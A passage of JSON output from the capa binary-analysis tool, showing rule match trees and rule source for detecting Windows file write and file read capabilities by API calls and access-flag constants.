                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllBytesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllLinesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllTextAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllLinesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllTextAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.FileInfo::AppendText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "subscope",
                              "scope": "basic block"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 1073741824,
                                      "description": "GENERIC_WRITE"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651783681
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 2,
                                      "description": "FILE_WRITE_DATA"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651783661
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "match",
                                      "match": "create or open file"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "statement",
                                        "statement": {
                                          "type": "or"
                                        }
                                      },
                                      "children": [
                                        {
                                          "success": true,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "CreateFile"
                                            }
                                          },
                                          "children": [],
                                          "locations": [
                                            {
                                              "type": "absolute",
                                              "value": 1651783689
                                            }
                                          ],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "CreateFileEx"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "IoCreateFile"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "IoCreateFileEx"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "ZwOpenFile"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "ZwCreateFile"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "NtOpenFile"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "NtCreateFile"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "LZCreateFile"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "LZOpenFile"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "fopen"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "fopen64"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "fdopen"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "freopen"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "open"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "openat"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        }
                                      ],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651783689
                                    }
                                  ],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651783644
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "write file on Windows/38a6be563e9a45669b4c21957bc154d9"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WriteFile"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651783753
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WriteFileEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtWriteFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ZwWriteFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "_fwrite"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "fwrite"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651797264
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllBytes"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllBytesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllLinesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllTextAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllLinesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllTextAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.FileInfo::AppendText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "subscope",
                              "scope": "basic block"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 1073741824,
                                      "description": "GENERIC_WRITE"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651797315
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 2,
                                      "description": "FILE_WRITE_DATA"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651797295
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "match",
                                      "match": "create or open file"
                                    }
                                  },
                                  "children": [
                                    {
                                      "success": true,
                                      "node": {
                                        "type": "statement",
                                        "statement": {
                                          "type": "or"
                                        }
                                      },
                                      "children": [
                                        {
                                          "success": true,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "CreateFile"
                                            }
                                          },
                                          "children": [],
                                          "locations": [
                                            {
                                              "type": "absolute",
                                              "value": 1651797320
                                            }
                                          ],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "CreateFileEx"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "IoCreateFile"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "IoCreateFileEx"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "ZwOpenFile"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "ZwCreateFile"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "NtOpenFile"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "NtCreateFile"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "LZCreateFile"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "LZOpenFile"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "fopen"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "fopen64"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "fdopen"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "freopen"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "open"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        },
                                        {
                                          "success": false,
                                          "node": {
                                            "type": "feature",
                                            "feature": {
                                              "type": "api",
                                              "api": "openat"
                                            }
                                          },
                                          "children": [],
                                          "locations": [],
                                          "captures": {}
                                        }
                                      ],
                                      "locations": [],
                                      "captures": {}
                                    }
                                  ],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651797320
                                    }
                                  ],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651797264
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "write file on Windows/38a6be563e9a45669b4c21957bc154d9"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WriteFile"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651797415
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WriteFileEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtWriteFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ZwWriteFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "_fwrite"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "fwrite"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ],
          [
            {
              "type": "absolute",
              "value": 1651804064
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllBytes"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllBytesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllLinesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::WriteAllTextAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllLinesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendAllTextAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::AppendText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.FileInfo::AppendText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
                        "feature": {
                          "type": "os",
                          "os": "windows"
                        }
                      },
                      "children": [],
                      "locations": [
                        {
                          "type": "no address"
                        }
                      ],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "optional"
                        }
                      },
                      "children": [
                        {
                          "success": true,
                          "node": {
                            "type": "statement",
                            "statement": {
                              "type": "subscope",
                              "scope": "basic block"
                            }
                          },
                          "children": [
                            {
                              "success": true,
                              "node": {
                                "type": "statement",
                                "statement": {
                                  "type": "or"
                                }
                              },
                              "children": [
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 1073741824,
                                      "description": "GENERIC_WRITE"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                },
                                {
                                  "success": true,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "number",
                                      "number": 2,
                                      "description": "FILE_WRITE_DATA"
                                    }
                                  },
                                  "children": [],
                                  "locations": [
                                    {
                                      "type": "absolute",
                                      "value": 1651804140
                                    },
                                    {
                                      "type": "absolute",
                                      "value": 1651804079
                                    }
                                  ],
                                  "captures": {}
                                },
                                {
                                  "success": false,
                                  "node": {
                                    "type": "feature",
                                    "feature": {
                                      "type": "match",
                                      "match": "create or open file"
                                    }
                                  },
                                  "children": [],
                                  "locations": [],
                                  "captures": {}
                                }
                              ],
                              "locations": [],
                              "captures": {}
                            }
                          ],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651804064
                            }
                          ],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "match",
                              "match": "write file on Windows/38a6be563e9a45669b4c21957bc154d9"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    },
                    {
                      "success": true,
                      "node": {
                        "type": "statement",
                        "statement": {
                          "type": "or"
                        }
                      },
                      "children": [
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WriteFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "WriteFileEx"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "NtWriteFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "ZwWriteFile"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": false,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "_fwrite"
                            }
                          },
                          "children": [],
                          "locations": [],
                          "captures": {}
                        },
                        {
                          "success": true,
                          "node": {
                            "type": "feature",
                            "feature": {
                              "type": "api",
                              "api": "fwrite"
                            }
                          },
                          "children": [],
                          "locations": [
                            {
                              "type": "absolute",
                              "value": 1651804130
                            }
                          ],
                          "captures": {}
                        }
                      ],
                      "locations": [],
                      "captures": {}
                    }
                  ],
                  "locations": [],
                  "captures": {}
                }
              ],
              "locations": [],
              "captures": {}
            }
          ]
        ]
      },
      "read file on Windows": {
        "meta": {
          "name": "read file on Windows",
          "namespace": "host-interaction/file-system/read",
          "authors": [
            "moritz.raabe@mandiant.com",
            "anushka.virgaonkar@mandiant.com"
          ],
          "scopes": {
            "static": "function",
            "dynamic": "span of calls"
          },
          "attack": [],
          "mbc": [
            {
              "parts": [
                "File System",
                "Read File"
              ],
              "objective": "File System",
              "behavior": "Read File",
              "method": "",
              "id": "C0051"
            }
          ],
          "references": [],
          "examples": [
            "BFB9B5391A13D0AFD787E87AB90F14F5:0x1314567B"
          ],
          "description": "",
          "lib": false,
          "is_subscope_rule": false,
          "maec": {}
        },
        "source": "rule:\r\n  meta:\r\n    name: read file on Windows\r\n    namespace: host-interaction/file-system/read\r\n    authors:\r\n      - moritz.raabe@mandiant.com\r\n      - anushka.virgaonkar@mandiant.com\r\n    scopes:\r\n      static: function\r\n      dynamic: span of calls\r\n    mbc:\r\n      - File System::Read File [C0051]\r\n    examples:\r\n      - BFB9B5391A13D0AFD787E87AB90F14F5:0x1314567B\r\n  features:\r\n    - or:\r\n      - and:\r\n        - os: windows\r\n        - optional:\r\n          - and:\r\n            - number: 0x80000000 = GENERIC_READ\r\n            - match: create or open file\r\n        - or:\r\n          - api: kernel32.ReadFile\r\n          - api: ReadFileEx\r\n          - api: NtReadFile\r\n          - api: ZwReadFile\r\n          - api: LZRead\r\n          - api: _read\r\n          - api: fread\r\n      - api: System.IO.File::ReadAllBytes\r\n      - api: System.IO.File::ReadAllBytesAsync\r\n      - api: System.IO.File::ReadAllLines\r\n      - api: System.IO.File::ReadAllLinesAsync\r\n      - api: System.IO.File::ReadAllText\r\n      - api: System.IO.File::ReadAllTextAsync\r\n      - api: System.IO.File::ReadLines\r\n",
        "matches": [
          [
            {
              "type": "absolute",
              "value": 1651784160
            },
            {
              "success": true,
              "node": {
                "type": "statement",
                "statement": {
                  "type": "or"
                }
              },
              "children": [
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllBytes"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllBytesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllLinesAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllText"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadAllTextAsync"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": false,
                  "node": {
                    "type": "feature",
                    "feature": {
                      "type": "api",
                      "api": "System.IO.File::ReadLines"
                    }
                  },
                  "children": [],
                  "locations": [],
                  "captures": {}
                },
                {
                  "success": true,
                  "node": {
                    "type": "statement",
                    "statement": {
                      "type": "and"
                    }
                  },
                  "children": [
                    {
                      "success": true,
                      "node": {
                        "type": "feature",
